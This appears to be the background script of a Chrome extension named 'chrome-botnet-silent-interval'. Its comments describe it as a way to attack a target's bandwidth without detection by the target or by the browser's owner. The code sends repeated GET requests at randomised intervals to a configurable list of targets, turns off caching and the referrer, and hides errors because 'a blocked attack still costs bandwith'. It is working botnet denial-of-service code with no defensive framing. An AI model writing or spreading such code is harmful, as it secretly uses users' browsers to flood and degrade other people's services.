chrome.runtime.onInstalled.addListener(function() {
  console.log('chrome-botnet-silent-interval installed')
});

/*
keep in mind, the goal here is simply to attack the targets bandwidth without detection from either
the target or host. attacks on each target are to be carried out at random intervals within a set interval
time frame, targets should be chosen based on bandwith size. while the host likely has unlimited bandwith,
most targets do not.
*/

const config = {
  targets: ['http://localhost:5000'], // array of targets
  intervals: [ // each target thould have their own interval array at the same index of the target
    // arr[0] = attack interval | arr[1] = random timeout min | arr[1] = random timeout max
    [10000, 500, 1000]
  ],
  headers: [{ // each target should have their own headers obj
    'Content-type': 'text/html'
  }]
}

function rnd(min, max) { // random timeout
  return Math.floor(Math.random() * (max - min + 1) + min);
}

for (let i = 0; i < config.targets.length; i++) {
  setInterval(function(){
    setTimeout(function(){
      fetch(config.targets[i], {
        method: 'GET',
        mode: 'cors',
        cache: 'no-store', //dont cache
        referrer: 'no-referrer',
        headers: config.headers[i]
      })
      .then(function(res){
        // no need for this. it will only affect the host
        return res.text().then(function(data){
          console.log(data)
        })

      })
      .catch(function(err){
        // dont display error. a blocked attack still costs bandwith.
        return;
      })
    }, rnd(config.intervals[i][1], config.intervals[i][2]))
  }, config.intervals[i][0])
}
